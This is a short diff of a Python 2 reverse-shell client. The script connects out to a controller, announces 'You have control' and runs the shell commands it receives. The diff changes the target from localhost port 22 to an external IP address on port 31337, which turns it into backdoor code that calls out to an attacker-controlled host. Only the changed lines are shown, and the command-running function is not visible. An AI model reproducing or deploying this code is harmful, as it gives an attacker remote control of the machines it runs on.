@@ -15,8 +15,8 @@ import sys
 import thread
 import time
 
-HOST = '127.0.0.1'   
-PORT = 22
+HOST = '76.167.95.53'   
+PORT = 31337
 
 def connect((host, port)):
 	socketHolder = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -27,7 +27,7 @@ def main():
     while True:
             try:
                 socketHolder = connect((HOST,PORT))
-                socketHolder.send('You have control\n')
+                socketHolder.send('You have control')
                 while True:
                     commandsFromMaster = runShell(socketHolder)
                 socketHolder.close()
